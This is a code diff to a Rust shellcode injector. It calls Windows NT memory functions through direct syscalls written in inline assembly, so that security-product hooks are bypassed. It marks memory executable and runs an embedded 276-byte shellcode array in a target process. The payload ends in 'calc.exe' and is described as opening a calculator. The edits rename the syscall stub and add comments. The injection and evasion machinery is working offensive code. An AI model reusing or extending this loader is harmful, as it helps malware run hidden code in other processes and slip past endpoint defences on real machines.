@@ -41,6 +41,8 @@ impl Drop for SafeHandle {
 }
 
 // Syscalls.
+// These need to be ported to being dynamically loaded, 
+// as the SNN's can change based on versions.
 global_asm!("
     zw_read_virtual_memory:
         mov r10, rcx
@@ -67,7 +69,7 @@ global_asm!("
         mov eax, 0x0C2
         syscall
         ret
-    nt_virtual_protect_ex_a:
+    zw_protect_virtual_memory:
         mov r10, rcx
         mov eax, 0x50
         syscall
@@ -121,7 +123,7 @@ extern "C" {
         attribute_list: CCvoid,             // [in]opt_ PPS_ATTRIBUTE_LIST AttributeList
     ) -> NTSTATUS;
     
-    fn nt_virtual_protect_ex_a(
+    fn zw_protect_virtual_memory(
         process_handle: HANDLE,             // [in] HANDLE ProcessHandle,
         base_address: PVoid,           // [in, out] PVOID *BaseAddress,
         region_size: PUsize,                // [in, out] PSIZE_T RegionSize,
@@ -290,7 +292,7 @@ fn nt_virtual_protect_ex(handle: HANDLE, address: CCvoid, size: usize, flags: u3
     let mut address: PVoid = address as PVoid;
 
     unsafe {
-        let status = nt_virtual_protect_ex_a(
+        let status = zw_protect_virtual_memory(
             handle, 
             address, 
             size as PUsize, 
@@ -303,7 +305,6 @@ fn nt_virtual_protect_ex(handle: HANDLE, address: CCvoid, size: usize, flags: u3
     }
 
 }
-
 
 fn virtual_protect_ex(handle: HANDLE, address: CCvoid, size: usize) {
     let protection_flags = PAGE_PROTECTION_FLAGS(0x10); // Execute.
@@ -332,7 +333,9 @@ fn virtual_protect_ex(handle: HANDLE, address: CCvoid, size: usize) {
 // and start the thread execution. Now, we close the handle(s) and continue our lives.
 
 
+
 fn main() {
+    // This opens a calculator
     let payload: [u8; 276] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,
     0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,
     0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
@@ -356,7 +359,7 @@ fn main() {
     0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,
     0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,
     0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,
-    0x2e,0x65,0x78,0x65,0x00];
+    0x2e,0x65,0x78,0x65,0x00]; 
     
     let current_process_pid = enumerate_processes().unwrap();
     //let args: Vec<String> = env::args().collect();
